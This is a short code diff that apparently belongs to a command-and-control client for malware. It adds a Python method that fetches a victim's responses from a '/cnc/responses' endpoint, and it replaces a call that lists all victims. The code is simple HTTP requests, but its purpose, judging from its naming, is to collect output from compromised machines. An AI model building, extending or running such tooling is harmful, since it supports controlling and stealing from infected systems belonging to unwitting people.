@@ -37,7 +37,13 @@ class Api:
         else:
             False
 
-    def get_response(id:int):
-        ...
+    def get_response(id:int,time:int=95778800): #magic number equvilant to 36 month that acts as infinity (for testing purposes currently will be changed later)
+        r = requests.get(API+f"/cnc/responses/{id}/{time}")
+        if r:
+            print(r.json())
+            return r.json()
+        else:
+            return {"Status":False}
+        
 if __name__ == "__main__":
-    print(Api.get_all_victims())
+    print(Api.get_response(id=1))
